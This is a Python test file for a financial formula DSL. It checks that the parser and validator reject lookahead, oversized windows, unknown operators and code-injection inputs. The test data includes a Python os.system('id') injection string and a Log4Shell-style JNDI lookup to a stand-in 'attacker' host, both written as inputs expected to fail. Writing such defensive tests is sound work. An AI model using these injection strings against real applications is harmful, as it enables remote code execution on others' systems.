from __future__ import annotations

import builtins
import importlib
import os
import subprocess

import pandas as pd
import pytest

from src.alpha_foundry.dsl.operators import FormulaValidationError, evaluate_formula
from src.alpha_foundry.dsl.parser import FormulaParser
from src.alpha_foundry.dsl.validator import validate_expression


def _panel() -> dict[str, pd.DataFrame]:
    return {
        "close": pd.DataFrame(
            {"AAA": [1.0, 2.0, 3.0], "BBB": [3.0, 2.0, 1.0]},
            index=pd.date_range("2025-01-01", periods=3),
        ),
        "open": pd.DataFrame(
            {"AAA": [1.0, 1.5, 2.5], "BBB": [3.0, 2.5, 1.5]},
            index=pd.date_range("2025-01-01", periods=3),
        ),
    }


@pytest.mark.parametrize(
    ("formula", "expected_error"),
    [
        ("rank(future_return)", "LOOKAHEAD_DETECTED"),
        ("delay(close, -1)", "LOOKAHEAD_DETECTED"),
        ("ts_mean(close, 999999999)", "WINDOW_OUT_OF_RANGE"),
        ("unknown_operator(close)", "OPERATOR_NOT_ALLOWED"),
    ],
)
def test_dsl_validator_rejects_adversarial_valid_syntax_payloads(
    formula: str,
    expected_error: str,
) -> None:
    with pytest.raises(FormulaValidationError) as excinfo:
        evaluate_formula(formula, _panel())

    assert expected_error in excinfo.value.errors


@pytest.mark.parametrize(
    "formula",
    [
        'rank(__import__("os").system("id"))',
        "rank(open); import os",
        'pandas.query("close > 1")',
        "${jndi:ldap://attacker}",
    ],
)
def test_dsl_parser_rejects_code_shaped_payloads_before_evaluation(formula: str) -> None:
    with pytest.raises(ValueError):
        FormulaParser().parse(formula)


def test_dsl_evaluation_never_calls_dynamic_execution_paths(monkeypatch: pytest.MonkeyPatch) -> None:
    def fail(*args, **kwargs):  # noqa: ANN002, ANN003
        raise AssertionError("dynamic execution path called")

    monkeypatch.setattr(builtins, "eval", fail)
    monkeypatch.setattr(builtins, "compile", fail)
    monkeypatch.setattr(importlib, "import_module", fail)
    monkeypatch.setattr(subprocess, "run", fail)
    monkeypatch.setattr(os, "system", fail)

    with pytest.raises(ValueError):
        evaluate_formula('rank(__import__("os").system("id"))', _panel())


def test_ast_node_limit_is_enforced_independently_from_operator_allowlist() -> None:
    ast = FormulaParser().parse(
        "add(add(add(add(add(add(close, close), close), close), close), close), close)"
    )

    result = validate_expression(ast)

    assert not result.ok
    assert "AST_NODE_LIMIT_EXCEEDED" in result.errors


def test_formula_length_limit_rejects_before_ast_construction() -> None:
    formula = "rank(" + ("close" * 200) + ")"

    with pytest.raises(ValueError, match="formula exceeds maximum length"):
        FormulaParser().parse(formula)
